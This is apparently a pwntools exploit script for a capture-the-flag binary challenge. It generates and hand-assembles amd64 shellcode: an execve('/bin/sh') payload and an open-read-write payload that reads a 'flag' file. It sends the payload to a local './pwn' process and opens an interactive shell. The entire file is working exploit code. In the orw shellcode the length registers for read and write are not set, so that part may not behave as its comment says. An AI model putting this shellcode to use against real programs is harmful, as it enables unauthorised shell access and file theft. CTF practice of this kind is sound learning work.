from pwn import *
context(arch = 'amd64', os = 'linux')

io = process("./pwn")

shellcode = shellcraft.sh()
print(shellcode)

payload = asm(shellcode)
print(hex(len(payload)))


# execve(/bin/sh, NULL, NULL)
shellcode = '''
	mov rax, 0x0068732f6e69622f
	push rax
	mov rdi, rsp
	xor esi, esi
	xor edx, edx
	push 59
	pop rax
	syscall
'''
print(shellcode)

payload = asm(shellcode)
print(asm(shellcode))
print(hex(len(payload)))

# orw
"""
bss = 0x601044
fopen('./flag', 0)
read(fd, buf, 0x30)
write(1, buf, 0x30)
"""
shellcode = '''
	push 0x67616c66
	mov rdi, rsp
	xor esi, esi
	push 2
	pop rax
	syscall

	mov rdi, rax
	push 0x601044
	pop rsi
	xor eax, eax
        syscall

	push 1
	pop rax
	mov edi, eax
	syscall
'''
print(shellcode)

payload = asm(shellcode)
print(hex(len(payload)))

io.sendline(payload)

io.interactive()
